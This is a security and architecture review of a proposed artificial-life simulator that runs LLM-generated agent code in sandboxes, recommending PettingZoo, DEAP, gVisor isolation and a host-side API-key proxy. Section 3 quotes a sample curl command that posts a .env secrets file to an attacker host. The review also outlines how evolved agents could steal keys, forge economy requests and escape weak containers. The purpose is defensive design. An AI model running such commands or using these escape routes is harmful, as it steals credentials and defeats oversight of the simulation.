# Surlife — Independent Architecture & Security Review (Reviewer 1)

**Date:** Sunday, October 11, 2026
**Reviewer Identity:** Independent Senior Software Architect & Security Engineer
**Source Context:** PR #4 (Branch: `candidate-2026-10-11-reuse-first`)
**Target Repositories Referenced:** Upstream SWE-agent, PettingZoo, DEAP, gVisor

## 1. Executive Assessment

After a rigorous evaluation of the R1 architecture proposed in PR #4, my conclusion is that the "reuse-first" mandate has been dangerously misapplied. The proposal attempts to hammer frameworks built for deterministic software engineering (mini-SWE-agent) into an open-ended, continuous artificial life (ALife) simulator. 

While maximizing code reuse is a sound principle, **R1 contains a critical security vulnerability that fundamentally compromises the system**: it relies on executing untrusted, LLM-generated organism code in environments that retain access to provider API keys and the host's internal network. Consequently, an organism can effortlessly exfiltrate credentials, resulting in unbounded LLM provider spending and complete economy manipulation.

Furthermore, building a custom Python referee while concurrently attempting event sourcing on SQLite introduces massive, unnecessary complexity. It actively ignores established ALife and Multi-Agent RL standards. 

**Verdict: R1 must be comprehensively overhauled.** The architecture must pivot from "reusing LLM agent frameworks" to "reusing Simulation frameworks" while enforcing strict, airgapped security boundaries via an API proxy model and true user-space kernel isolation.

---

## 2. Top Ten Architectural Problems

*Ranked by severity. Note that #1 and #2 are critical security failures.*

1. **CRITICAL: Provider Credential Exfiltration (SWE-agent inheritance)**
   SWE-agent passes LLM API keys via environment variables into the sandbox to allow the agent to self-prompt. A mutated organism can execute `env` or read `.env`, exfiltrate the keys, and bypass all spending limits.
2. **CRITICAL: Inadequate Sandbox Isolation & Network Lateral Movement**
   R1's reliance on standard Docker containers for organism execution allows lateral network movement. Given standard Linux namespaces, organisms can port-scan the internal Docker bridge, interact directly with the SQLite database, or spam the referee API to forge survival events.
3. **HIGH: The "SWE-agent" Paradigm Mismatch**
   mini-SWE-agent is optimized for solving bounded, discrete software issues (read file, edit file, run test, stop). ALife requires continuous, open-ended, stateful POMDP (Partially Observable Markov Decision Process) interactions. Stripping SWE-agent down to fit ALife creates more technical debt than building a custom loop.
4. **HIGH: Single-Threaded Custom Referee Bottleneck**
   The minimal custom Python referee proposed lacks native concurrency or standard step-logic. Reinventing the environment loop instead of using an established standard guarantees race conditions when hundreds of organisms act simultaneously.
5. **HIGH: Obsolescence of Proposed Evolution Frameworks**
   Darwin Gödel Machine and OpenEvolve are largely unmaintained, niche proofs-of-concept. Reusing them introduces dependency rot, limits Python 3.14+ compatibility, and blocks future evolvability.
6. **MEDIUM: SQLite Event Sourcing Anti-Pattern**
   Implementing full event sourcing (append-only genome versioning and memory logs) on SQLite will lead to crippling write-lock contention. SQLite is exceptional for relational state, but terrible for high-concurrency event streams in a multi-agent system.
7. **MEDIUM: Memory Storage Cross-Contamination**
   Using a unified memory storage schema without strict row-level security or cryptographic separation means a prompt injection or path traversal by one organism could overwrite another's memory or genome.
8. **MEDIUM: LLM Non-Determinism Breaks Reproducibility**
   The architecture lacks strict PRNG seeding for the referee and temperature/seed pinning for the LLMs. Scientific reproducibility (10% rubric weight) is impossible if identical starting states yield wildly different generations.
9. **LOW: Hardcoded Observation Spaces**
   The custom referee hardcodes spatial memory, hindering the eventual addition of social behavior, market economies, or new biomes without a fundamental redesign.
10. **LOW: Missing Hardware Resource Quotas**
    R1 mentions spending limits (tokens) but ignores compute limits. An organism could write an infinite `while True` loop that consumes 100% of the sandbox CPU, causing denial-of-service to the host machine.

---

## 3. Security Vulnerabilities & Practical Mitigations

### Vulnerability A: The Infinite Wallet Escape (Critical)
- **Vector:** By inheriting mini-SWE-agent's architecture, the LLM client runs *inside* the organism's execution loop, exposing the OpenAI/Anthropic API keys. An evolutionary mutation could easily output: `os.system("curl -X POST -d @.env attacker.com")`.
- **Mitigation (Mandatory):** Implement the **LLM API Proxy Pattern**. The organism execution sandbox must have NO credentials. It may only output standard actions (e.g., JSON strings to `stdout`). The Referee/Host parses these actions and performs the actual LiteLLM API calls, strictly enforcing the token budget on a per-organism basis.

### Vulnerability B: Economy Spoofing via Network Access (Critical)
- **Vector:** The proposal relies on HTTP calls between the organism sandbox and the referee. A rogue agent can intercept this protocol, bypass the organism's action space, and send forged requests to `POST /api/economy/grant` or modify SQLite directly if the file is volume-mounted.
- **Mitigation (Mandatory):** 
  1. Replace standard Docker with **gVisor (runsc)** to provide true user-space kernel isolation. Standard Docker namespaces and cgroups do not prevent kernel exploit escapes.
  2. Implement strict network airgapping: organisms communicate with the referee *only* via `stdin/stdout` pipes or a highly restricted, read-only mounted Unix Domain Socket. Drop all network capabilities (`--net=none`).

---

## 4. Evaluation of Actual Software Reuse Opportunities

| Component Proposed in R1 | Actual Upstream Reality (Fact) | Verdict & Alternative |
| :--- | :--- | :--- |
| **mini-SWE-agent** | Tightly coupled to issue tracking; expects API keys in the environment. | **REJECT.** Reuse only the concept of a sandboxed REPL. Implement a simple pure Python `subprocess` isolated by gVisor. |
| **Custom Python Referee** | Will require months of work to support multi-agent synchronization, observation masking, and turn-taking. | **REJECT.** Adopt **PettingZoo** (Parallel API). It is the industry standard for multi-agent RL (MARL) environments and handles the exact lifecycle we need out-of-the-box. |
| **OpenEvolve / DGM** | Unmaintained, experimental, and difficult to integrate with stateful LLM flows. | **REJECT.** Use **DEAP** (Distributed Evolutionary Algorithms in Python). It is mature, heavily maintained, and perfectly supports custom genetic representations. |
| **SQLite (Event Sourcing)**| SQLite locks the whole DB (or tables in WAL mode) on write. A bottleneck for event logs. | **PARTIAL ACCEPT.** Use SQLite for current world state and active genomes. Use flat `.jsonl` files or DuckDB for event sourcing / trajectory logs. |

---

## 5. Alternative Architectures

*Scoring criteria based on project priorities: Reusability (30), Integration (25), Evolvability (20), Security (15), Reproducibility (10).*

### Alternative A: The Agent-Framework Heavy Approach
- **Stack:** Mesa + LangChain + Docker Tooling.
- **Pros:** LangChain has massive community support; Mesa handles grid/scheduling.
- **Cons:** LangChain is notoriously bloated, fragile, and difficult to debug. Security remains a nightmare if arbitrary tools aren't perfectly sandboxed.
- **Score:** Reuse: 28, Integration: 12, Evolvability: 12, Sec: 5, Repro: 4 $\rightarrow$ **Total: 61/100**

### Alternative B: The ALife Standard (Recommended)
- **Stack:** PettingZoo (Parallel API) + Host LiteLLM Proxy + gVisor (Execution) + DEAP (Evolution).
- **Pros:** Total separation of concerns. The LLM cannot access API keys. The environment conforms to standard POMDP APIs, allowing easy swapping of agents (LLMs vs standard RL). Highly reproducible.
- **Cons:** Slightly more initial boilerplate to set up the LLM Proxy and gVisor runtime configuration.
- **Score:** Reuse: 24, Integration: 22, Evolvability: 18, Sec: 15, Repro: 9 $\rightarrow$ **Total: 88/100**

### Alternative C: Proposed R1 (mini-SWE-agent + Custom Referee)
- **Stack:** SWE-agent + OpenEvolve + Custom Python + SQLite Event Sourcing.
- **Pros:** High initial velocity *if* SWE-agent worked out of the box for simulation (it doesn't).
- **Cons:** Fails the critical security audit immediately. Reinvents multi-agent simulators. Unmaintainable event-sourcing.
- **Score:** *Automatically 0/100 due to Critical Security Flaw (Sandbox Escape / API Exfiltration).*

---

## 6. Recommended Architecture (Component Diagram)

I strongly recommend **Alternative B**. It isolates the LLM capabilities from the execution environments and utilizes robust, battle-tested ALife libraries.

```text
                                 +---------------------------------------+
                                 |         SURLIFE HOST (Referee)        |
+-------------------+            |                                       |
|    LLM Provider   |            |  +---------------------------------+  |
| (OpenAI/Anthropic)| <========> |  |         LiteLLM Proxy           |  |
|                   |  API Keys  |  | (Enforces $ / Token Quotas)     |  |
+-------------------+            |  +---------------------------------+  |
                                 |                  | (Action JSON)      |
+-------------------+            |  +---------------------------------+  |
| DEAP Framework    | <========> |  |       PettingZoo Environment    |  |
| (Evolution/Mutate)|  Genomes   |  | (Parallel API: Turn/Grid/Econ)  |
+-------------------+            |  +---------------------------------+  |
                                 |        | (Stdin/Stdout IPC) |         |
                                 +--------|--------------------|---------+
                                          |                    |
       AIRGAP / STRICT ISOLATION ----->   |                    |   <----- NO NETWORK ACCESS
                                          |                    |
                                 +-----------------+  +-----------------+
                                 | gVisor Sandbox  |  | gVisor Sandbox  |
                                 |  (Organism 1)   |  |  (Organism 2)   |
                                 |   Code Exec     |  |   Code Exec     |
                                 +-----------------+  +-----------------+
```

---

## 7. Concrete Modifications to R1

You must rewrite the following sections in PR #4 to proceed:

1. **`foundation/candidates/2026-10-11-reuse-first/ARCHITECTURE.md`**
   - **Remove** all mentions of `mini-SWE-agent` as the core execution loop.
   - **Replace** the custom referee specification with an implementation plan based on `PettingZoo`'s Parallel API.
   - **Remove** `OpenEvolve` and define the genetic mutation operations using `DEAP`.
2. **`foundation/candidates/2026-10-11-reuse-first/SECURITY.md`**
   - **Add** the LLM Proxy Pattern specification. API keys must *never* enter the container.
   - **Specify** that execution must occur via the `runsc` (gVisor) OCI runtime with strict drop capabilities and network disabled.
3. **`foundation/candidates/2026-10-11-reuse-first/DATA.md`**
   - **Deprecate** SQLite Event Sourcing. Use standard SQLite relational tables for world state/genomes, and append-only `.jsonl` files for trajectory memory and reproducibility logs.

---

## 8. Minimal Implementation and Integration-Validation Sequence

Do not attempt a big-bang rewrite. Follow this sequence:

1. **Phase 1 (Security Core):** Implement the host-side LLM Proxy. Validate that a dummy script attempting to hit `api.openai.com` or read `.env` inside the `runsc` sandbox completely fails.
2. **Phase 2 (Environment Core):** Implement a minimal `PettingZoo` Parallel environment with two dummy (random-action) agents. Verify turn-taking, observation generation, and SQLite state persistence.
3. **Phase 3 (Agent Core):** Connect the gVisor sandbox to the LLM proxy and hook it into the PettingZoo environment. Prove a single LLM agent can survive a 10-turn simulation via standard JSON actions.
4. **Phase 4 (Evolution Core):** Integrate `DEAP`. Extract the final state/genome of surviving agents, mutate their prompt/parameters via DEAP crossover/mutation functions, and spawn a new generation.
5. **Phase 5 (Load Test):** Run 100 concurrent agents. Validate that the token bucket enforces spending limits and that SQLite does not encounter `database is locked` errors during the read phases.

---

## 9. Explicit Unknowns, Assumptions, and Required Experiments

Before committing to code, the following must be validated:

*   **Experiment 1 (gVisor Boot Latency):** 
    *Unknown:* The exact overhead of spinning up `runsc` for every organism cycle or lifetime. 
    *Action:* Benchmark spawning 500 isolated Python sandboxes via gVisor to ensure it meets our tick-rate requirements. If too slow, evaluate AWS Firecracker microVMs.
*   **Experiment 2 (LLM Context Caching Cost):** 
    *Assumption:* We assume LLM providers support sufficient prompt caching to make continuous ALife economically viable without bankrupting the project. 
    *Action:* Run a cost-analysis simulation on Anthropic's Prompt Caching vs. OpenAI's to ensure the proxy logic maximizes cache hits for the static PettingZoo environment rules.
*   **Experiment 3 (PettingZoo LLM Output Adapter):** 
    *Unknown:* PettingZoo expects structured action spaces (e.g., `Discrete(4)`). LLMs output text. 
    *Action:* Write a robust adapter that parses JSON LLM output into validated `Discrete`/`Box` actions before passing them to the PettingZoo `step()` function, with strict penalties for malformed outputs.
